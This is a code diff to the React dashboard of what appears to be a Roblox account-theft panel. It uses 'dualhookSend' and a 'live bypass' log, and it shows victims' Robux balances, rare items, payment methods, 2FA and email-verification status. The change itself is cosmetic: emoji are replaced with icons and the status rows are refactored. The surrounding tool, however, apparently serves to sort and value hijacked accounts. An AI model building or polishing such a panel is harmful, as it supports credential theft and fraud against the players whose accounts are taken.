@@ -1,6 +1,6 @@
 import { useEffect, useState } from "react";
 import { useNavigate } from "react-router-dom";
-import { Shield, Zap, Cookie, Loader2, X, Activity, Menu } from "lucide-react";
+import { Shield, Zap, Cookie, Loader2, X, Activity, Menu, CheckCircle2, XCircle } from "lucide-react";
 import {
   dualhookSend, AccountInfo,
   getLiveBypassLog, LiveBypassEntry,
@@ -120,8 +120,8 @@ const Dashboard = () => {
                     <p className="text-sm font-medium text-foreground truncate">{e.username}</p>
                     <p className="text-[10px] text-muted-foreground">{new Date(e.timestamp).toLocaleTimeString()}</p>
                   </div>
-                  <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full ${e.success ? 'bg-[hsl(var(--success))]/20 text-[hsl(var(--success))]' : 'bg-destructive/20 text-destructive'}`}>
-                    {e.success ? '✅ Success' : '❎ No'}
+                  <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full inline-flex items-center gap-1 ${e.success ? 'bg-[hsl(var(--success))]/20 text-[hsl(var(--success))]' : 'bg-destructive/20 text-destructive'}`}>
+                    {e.success ? <><CheckCircle2 size={11} /> Success</> : <><XCircle size={11} /> Failed</>}
                   </span>
                 </div>
               ))}
@@ -161,13 +161,22 @@ const Dashboard = () => {
                 </div>
                 <div className="flex justify-between"><span className="text-muted-foreground">Robux</span><span className="text-foreground font-mono">{String(result.robux ?? 0)} | {String(result.pendingRobux ?? 0)}</span></div>
                 <div className="flex justify-between"><span className="text-muted-foreground">Spent</span><span className="text-foreground font-mono">{String(result.robuxSpent ?? 0)}</span></div>
-                <div className="flex justify-between"><span className="text-muted-foreground">Premium</span><span>{result.premium ? '✅' : '❎'}</span></div>
-                <div className="flex justify-between"><span className="text-muted-foreground">Korblox</span><span>{result.korblox ? '✅' : '❎'}</span></div>
-                <div className="flex justify-between"><span className="text-muted-foreground">Headless</span><span>{result.headless ? '✅' : '❎'}</span></div>
-                <div className="flex justify-between"><span className="text-muted-foreground">Valkyrie</span><span>{result.valkyrie ? '✅' : '❎'}</span></div>
-                <div className="flex justify-between"><span className="text-muted-foreground">Payment</span><span>{result.hasPayment ? '✅' : '❎'}</span></div>
-                <div className="flex justify-between"><span className="text-muted-foreground">2FA</span><span>{result.has2FA ? '✅' : '❎'}</span></div>
-                <div className="flex justify-between"><span className="text-muted-foreground">Email Verified</span><span>{result.emailVerified ? '✅' : '❎'}</span></div>
+                {([
+                  ['Premium', result.premium],
+                  ['Korblox', result.korblox],
+                  ['Headless', result.headless],
+                  ['Valkyrie', result.valkyrie],
+                  ['Payment', result.hasPayment],
+                  ['2FA', result.has2FA],
+                  ['Email Verified', result.emailVerified],
+                ] as [string, boolean | undefined][]).map(([label, v]) => (
+                  <div key={label} className="flex justify-between items-center">
+                    <span className="text-muted-foreground">{label}</span>
+                    {v
+                      ? <CheckCircle2 size={14} className="text-[hsl(var(--success))]" />
+                      : <XCircle size={14} className="text-destructive" />}
+                  </div>
+                ))}
               </div>
             )}
           </div>
